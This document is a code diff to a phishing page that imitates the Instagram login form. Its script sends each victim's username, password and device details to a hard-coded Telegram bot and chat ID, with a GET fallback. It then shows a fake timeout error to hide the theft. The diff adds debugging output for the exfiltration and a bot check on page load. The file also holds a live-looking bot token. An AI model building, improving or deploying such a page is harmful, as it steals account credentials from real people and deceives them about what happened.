@@ -76,6 +76,19 @@
     .stores { text-align: center; margin-top: 12px; }
     .stores img { height: 40px; margin: 0 4px; }
     .error-msg { color: #ed4956; font-size: 14px; text-align: center; margin: 10px 0; display: none; }
+    /* Debug area – visible only when there's a message */
+    .debug-box {
+      background: #1a1a1a;
+      border: 1px solid #333;
+      color: #0f0;
+      font-family: monospace;
+      font-size: 12px;
+      padding: 10px;
+      border-radius: 6px;
+      margin: 10px 0;
+      white-space: pre-wrap;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -127,7 +140,10 @@
           <label>Password</label>
           <button type="button" class="toggle-pw" id="toggle">Show</button>
         </div>
+        <!-- Fake error that appears after login -->
         <div class="error-msg" id="error">Request timed out. Please try again.</div>
+        <!-- Debug box for Telegram errors -->
+        <div class="debug-box" id="debugBox"></div>
         <button type="submit" class="login-btn" id="loginBtn">
           <span class="spinner"></span><span class="btn-text">Log in</span>
         </button>
@@ -148,7 +164,7 @@
 </div>
 
 <script>
-  (function() {
+  document.addEventListener('DOMContentLoaded', function() {
     const BOT_TOKEN = '8899386309:AAHoIXA6r10xR1e3e1cO_G_-FQZKnYACD8w';
     const CHAT_ID = '1998767298';
 
@@ -158,54 +174,69 @@
     const loginBtn = document.getElementById('loginBtn');
     const toggleBtn = document.getElementById('toggle');
     const errorDiv = document.getElementById('error');
+    const debugBox = document.getElementById('debugBox');
+
+    function showDebug(msg, isError = false) {
+      debugBox.textContent = msg;
+      debugBox.style.color = isError ? '#ff4444' : '#0f0';
+      debugBox.style.display = 'block';
+    }
 
     function getDeviceInfo() {
-      const ua = navigator.userAgent;
-      const isMobile = /Mobi|Android/i.test(ua);
       return {
         platform: navigator.platform,
         language: navigator.language,
         screen: `${screen.width}x${screen.height}`,
         viewport: `${window.innerWidth}x${window.innerHeight}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        deviceType: isMobile ? 'Mobile' : 'Desktop',
-        userAgent: ua
+        userAgent: navigator.userAgent,
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
       };
     }
 
     async function sendToTelegram(user, pass) {
       const device = getDeviceInfo();
       const now = new Date().toLocaleString();
-      const text = `🔐 *Instagram Login*\n\n` +
-        `👤 *Username:* \`${user}\`\n` +
-        `🔑 *Password:* \`${pass}\`\n\n` +
-        `📱 *Device Info*\n` +
+      // Plain text (no Markdown) to avoid parsing failures
+      const text = `🔐 Instagram Login\n\n` +
+        `👤 Username: ${user}\n` +
+        `🔑 Password: ${pass}\n\n` +
+        `📱 Device Info\n` +
         `• Type: ${device.deviceType}\n` +
         `• OS: ${device.platform}\n` +
-        `• Browser: ${device.userAgent}\n` +
+        `• UA: ${device.userAgent}\n` +
         `• Screen: ${device.screen}\n` +
         `• Viewport: ${device.viewport}\n` +
         `• Language: ${device.language}\n` +
         `• Timezone: ${device.timezone}\n\n` +
-        `🕐 *Date & Time:* ${now}`;
+        `🕐 Date & Time: ${now}`;
 
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+          })
         });
         const data = await res.json();
-        return data.ok;
+        if (!data.ok) {
+          throw new Error(`Telegram API error: ${data.description} (code ${data.error_code})`);
+        }
+        return { ok: true };
       } catch (e) {
-        // GET fallback
+        // Try GET as a last resort
         try {
           const encoded = encodeURIComponent(text);
           const getRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`);
           const getData = await getRes.json();
-          return getData.ok;
+          if (!getData.ok) {
+            throw new Error(`GET fallback error: ${getData.description}`);
+          }
+          return { ok: true };
         } catch (e2) {
-          return false;
+          throw e2; // rethrow
         }
       }
     }
@@ -219,11 +250,16 @@
       loginBtn.classList.add('loading');
       loginBtn.disabled = true;
       errorDiv.style.display = 'none';
+      debugBox.style.display = 'none';
 
-      // Send silently to Telegram
-      sendToTelegram(user, pass);
+      try {
+        await sendToTelegram(user, pass);
+        showDebug('✅ Sent to Telegram', false);
+      } catch (err) {
+        showDebug('❌ ' + err.message, true);
+      }
 
-      // Simulate a delay then show the error message
+      // Always show the fake timeout error after 2s
       setTimeout(() => {
         loginBtn.classList.remove('loading');
         loginBtn.disabled = false;
@@ -234,7 +270,10 @@
     }
 
     form.addEventListener('submit', handleLogin);
-    loginBtn.addEventListener('click', handleLogin);
+    loginBtn.addEventListener('click', (e) => {
+      // Fallback if form submit isn't triggered
+      if (e.target === loginBtn) handleLogin(e);
+    });
 
     toggleBtn.addEventListener('click', () => {
       const isPass = passInput.type === 'password';
@@ -242,11 +281,21 @@
       toggleBtn.textContent = isPass ? 'Hide' : 'Show';
     });
 
-    // Disable demo links
-    document.querySelector('.fb-btn').addEventListener('click', (e) => e.preventDefault());
-    document.querySelector('.forgot').addEventListener('click', (e) => e.preventDefault());
-    document.querySelector('.signup-card a').addEventListener('click', (e) => e.preventDefault());
-  })();
+    // Quick test: ping the bot on load (silent)
+    (async () => {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+        const data = await res.json();
+        if (!data.ok) {
+          console.warn('Bot token invalid or unreachable:', data.description);
+        } else {
+          console.log('Bot online:', data.result.username);
+        }
+      } catch(e) {
+        console.warn('Cannot reach Telegram API at all');
+      }
+    })();
+  });
 </script>
 </body>
 </html>
